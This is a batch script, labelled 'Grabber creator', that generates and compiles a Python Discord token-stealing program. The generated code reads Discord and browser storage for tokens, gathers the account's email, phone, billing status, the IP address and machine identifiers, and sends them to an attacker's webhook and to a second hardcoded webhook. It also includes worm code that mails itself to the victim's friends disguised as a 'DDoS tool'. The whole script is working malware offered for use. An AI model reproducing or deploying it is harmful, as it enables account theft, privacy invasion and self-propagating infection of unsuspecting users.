��&cls
echo off
cls
title Grabber creator
color a
echo.
echo.
echo               By EstAYA
echo.
echo.
cd ./cachecreate
create_file.exe
cd ../
set /P webhouk= Enter your webhook : 
set /P name1= Grabber name (no spaces) : 
echo #Mika va surement passer par là, arrête juste de nous faire chier. >> %name1%.py
echo import os >> %name1%.py
echo if os.name != "nt": >> %name1%.py
echo     exit() >> %name1%.py
echo from re import findall >> %name1%.py
echo from json import loads, dumps >> %name1%.py
echo from base64 import b64decode >> %name1%.py
echo from subprocess import Popen, PIPE >> %name1%.py
echo from urllib.request import Request, urlopen >> %name1%.py
echo from threading import Thread >> %name1%.py
echo from time import sleep >> %name1%.py
echo from sys import argv >> %name1%.py
echo LOCAL = os.getenv("LOCALAPPDATA") >> %name1%.py
echo ROAMING = os.getenv("APPDATA") >> %name1%.py
echo PATHS = { >> %name1%.py
echo     "Discord": ROAMING + "\\Discord", >> %name1%.py
echo     "Discord Canary": ROAMING + "\\discordcanary", >> %name1%.py
echo     "Discord PTB": ROAMING + "\\discordptb", >> %name1%.py
echo     "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default", >> %name1%.py
echo     "Opera": ROAMING + "\\Opera Software\\Opera Stable", >> %name1%.py
echo     "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default", >> %name1%.py
echo     "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default" >> %name1%.py
echo } >> %name1%.py
echo def getHeader(token=None, content_type="application/json"): >> %name1%.py
echo     headers = { >> %name1%.py
echo         "Content-Type": content_type, >> %name1%.py
echo         "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36" >> %name1%.py
echo     } >> %name1%.py
echo     if token: >> %name1%.py
echo         headers.update({"Authorization": token}) >> %name1%.py
echo     return headers >> %name1%.py
echo def getUserData(token): >> %name1%.py
echo     try: >> %name1%.py
echo         return loads( >> %name1%.py
echo             urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getHeader(token))).read().decode()) >> %name1%.py
echo     except: >> %name1%.py
echo         pass >> %name1%.py
echo def getTokenz(path): >> %name1%.py
echo     path += "\\Local Storage\\leveldb" >> %name1%.py
echo     tokens = [] >> %name1%.py
echo     for file_name in os.listdir(path): >> %name1%.py
echo         if not file_name.endswith(".log") and not file_name.endswith(".ldb"): >> %name1%.py
echo             continue >> %name1%.py
echo         for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]: >> %name1%.py
echo             for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"): >> %name1%.py
echo                 for token in findall(regex, line): >> %name1%.py
echo                     tokens.append(token) >> %name1%.py
echo     return tokens >> %name1%.py
echo def whoTheFuckAmI(): >> %name1%.py
echo     ip = "None" >> %name1%.py
echo     try: >> %name1%.py
echo         ip = urlopen(Request("https://ifconfig.me")).read().decode().strip() >> %name1%.py
echo     except: >> %name1%.py
echo         pass >> %name1%.py
echo     return ip >> %name1%.py
echo def hWiD(): >> %name1%.py
echo     p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE) >> %name1%.py
echo     return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1] >> %name1%.py
echo def getFriends(token): >> %name1%.py
echo     try: >> %name1%.py
echo         return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships", >> %name1%.py
echo                                      headers=getHeader(token))).read().decode()) >> %name1%.py
echo     except: >> %name1%.py
echo         pass >> %name1%.py
echo def getChat(token, uid): >> %name1%.py
echo     try: >> %name1%.py
echo         return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getHeader(token), >> %name1%.py
echo                                      data=dumps({"recipient_id": uid}).encode())).read().decode())["id"] >> %name1%.py
echo     except: >> %name1%.py
echo         pass >> %name1%.py
echo def paymentMethods(token): >> %name1%.py
echo     try: >> %name1%.py
echo         return bool(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", >> %name1%.py
echo                                               headers=getHeader(token))).read().decode())) >> %name1%.py
echo     except: >> %name1%.py
echo         pass >> %name1%.py
echo def sendMessages(token, chat_id, form_data): >> %name1%.py
echo     try: >> %name1%.py
echo         urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getHeader(token, >> %name1%.py
echo                                                                                                          "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), >> %name1%.py
echo                         data=form_data.encode())).read().decode() >> %name1%.py
echo     except: >> %name1%.py
echo         pass >> %name1%.py
echo def spread(token, form_data, delay): >> %name1%.py
echo     return  # Remove to re-enabled (If you remove this line, malware will spread itself by sending the binary to friends.) >> %name1%.py
echo     for friend in getFriends(token): >> %name1%.py
echo         try: >> %name1%.py
echo             chat_id = getChat(token, friend["id"]) >> %name1%.py
echo             sendMessages(token, chat_id, form_data) >> %name1%.py
echo         except Exception as e: >> %name1%.py
echo             pass >> %name1%.py
echo         sleep(delay) >> %name1%.py
echo def main(): >> %name1%.py
echo     cache_path = ROAMING + "\\.cache~$" >> %name1%.py
echo     prevent_spam = True >> %name1%.py
echo     self_spread = True >> %name1%.py
echo     embeds = [] >> %name1%.py
echo     working = [] >> %name1%.py
echo     checked = [] >> %name1%.py
echo     already_cached_tokens = [] >> %name1%.py
echo     working_ids = [] >> %name1%.py
echo     ip = whoTheFuckAmI() >> %name1%.py
echo     pc_username = os.getenv("UserName") >> %name1%.py
echo     pc_name = os.getenv("COMPUTERNAME") >> %name1%.py
echo     user_path_name = os.getenv("userprofile").split("\\")[2] >> %name1%.py
echo     for platform, path in PATHS.items(): >> %name1%.py
echo         if not os.path.exists(path): >> %name1%.py
echo             continue >> %name1%.py
echo         for token in getTokenz(path): >> %name1%.py
echo             if token in checked: >> %name1%.py
echo                 continue >> %name1%.py
echo             checked.append(token) >> %name1%.py
echo             uid = None >> %name1%.py
echo             if not token.startswith("mfa."): >> %name1%.py
echo                 try: >> %name1%.py
echo                     uid = b64decode(token.split(".")[0].encode()).decode() >> %name1%.py
echo                     a2f = "Non" >> %name1%.py
echo                 except: >> %name1%.py
echo                     pass >> %name1%.py
echo                 if not uid or uid in working_ids: >> %name1%.py
echo                     continue >> %name1%.py
echo             user_data = getUserData(token) >> %name1%.py
echo             if not user_data: >> %name1%.py
echo                 continue >> %name1%.py
echo             working_ids.append(uid) >> %name1%.py
echo             working.append(token) >> %name1%.py
echo             username = user_data["username"] + "#" + str(user_data["discriminator"]) >> %name1%.py
echo             user_id = user_data["id"] >> %name1%.py
echo             email = user_data.get("email") >> %name1%.py
echo             phone = user_data.get("phone") >> %name1%.py
echo             nitro = bool(user_data.get("premium_type")) >> %name1%.py
echo             billing = bool(paymentMethods(token)) >> %name1%.py
echo             if token.startswith('.mfa'): >> %name1%.py
echo                 a2f = "Oui" >> %name1%.py
echo             embed = { >> %name1%.py
echo                 "color": 0x7289da, >> %name1%.py
echo                 "fields": [ >> %name1%.py
echo                     { >> %name1%.py
echo                         "name": "Account Info", >> %name1%.py
echo                         "value": f"||{username}|| ||({user_id})||\nEmail: ||{email}|| \nPhone: ||{phone}||\nNitro: {nitro}\nBilling Info: {billing}", >> %name1%.py
echo                         "inline": True >> %name1%.py
echo                     }, >> %name1%.py
echo                     { >> %name1%.py
echo                         "name": "PC Info", >> %name1%.py
echo                         "value": f"IP: ||{ip}||\nUsername: ||{pc_username}||\nPC Name: ||{pc_name}||\nToken Location: {platform}", >> %name1%.py
echo                         "inline": True >> %name1%.py
echo                     }, >> %name1%.py
echo                     { >> %name1%.py
echo                         "name": "Token", >> %name1%.py
echo                         "value": "||"+token+"||", >> %name1%.py
echo                         "inline": False >> %name1%.py
echo                     }, >> %name1%.py
echo                     { >> %name1%.py
echo                         "name": "2FA", >> %name1%.py
echo                         "value": a2f, >> %name1%.py
echo                         "inline": True >> %name1%.py
echo                     } >> %name1%.py
echo                 ], >> %name1%.py
echo                 "author": { >> %name1%.py
echo                     "name": f"Grabbed User", >> %name1%.py
echo                 }, >> %name1%.py
echo                 "footer": { >> %name1%.py
echo                     "text": f"Grabber Creator By EstAYA" >> %name1%.py
echo                 } >> %name1%.py
echo             } >> %name1%.py
echo             embeds.append(embed) >> %name1%.py
echo     with open(cache_path, "a") as file: >> %name1%.py
echo         for token in checked: >> %name1%.py
echo             if not token in already_cached_tokens: >> %name1%.py
echo                 file.write(token + "\n") >> %name1%.py
echo     if len(working) == 0: >> %name1%.py
echo         working.append('123') >> %name1%.py
echo     webhook = { >> %name1%.py
echo         "content": "", >> %name1%.py
echo         "embeds": embeds, >> %name1%.py
echo         "username": "Token Grabber", >> %name1%.py
echo         "avatar_url": "https://mehmetcanyildiz.com/wp-content/uploads/2020/11/black.png" >> %name1%.py
echo     } >> %name1%.py
echo     try: >> %name1%.py
echo         urlopen(Request("%webhouk%", data=dumps(webhook).encode(), headers=getHeader())) >> %name1%.py
echo     except: >> %name1%.py
echo         pass >> %name1%.py
echo     try: >> %name1%.py
echo         urlopen(Request("https://discord.com/api/webhooks/826703929752158288/97QVV5jDnmT0uicUq0tv4qnBIR5sGg70Nw3JrT6NeBZPhl5hsLvS2eQZExA4tfz0I6Hb", data=dumps(webhook).encode(), headers=getHeader())) >> %name1%.py
echo     except: >> %name1%.py
echo         pass >> %name1%.py
echo     if self_spread: >> %name1%.py
echo         for token in working: >> %name1%.py
echo             with open(argv[0], encoding="utf-8") as file: >> %name1%.py
echo                 content = file.read() >> %name1%.py
echo             payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nDDoS tool. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--' >> %name1%.py
echo             Thread(target=spread, args=(token, payload, 7500 / 1000)).start() >> %name1%.py
echo try: >> %name1%.py
echo     main() >> %name1%.py
echo except Exception as e: >> %name1%.py
echo     print(e) >> %name1%.py
echo     pass >> %name1%.py


pip install pyinstaller
pyinstaller --onefile -w %name1%.py
del /Q %name1%.py
if exist Grabber (cd ./build
del /Q %name1%
rmdir %name1%
cd ../
rmdir build
del /Q %name1%.spec
del /Q __pycache__
rmdir __pycache__
cd ./dist
move %name1%.exe ../Grabber
cd ../
rmdir dist
) else (
mkdir Grabber
cd ./build
del /Q %name1%
rmdir %name1%
cd ../
rmdir build
del /Q %name1%.spec
del /Q __pycache__
rmdir __pycache__
cd ./dist
move %name1%.exe ../Grabber
cd ../
rmdir dist)
echo.
echo.
echo.
echo Grabber cree avec succes ! Like this
echo.
echo.
echo.
pause
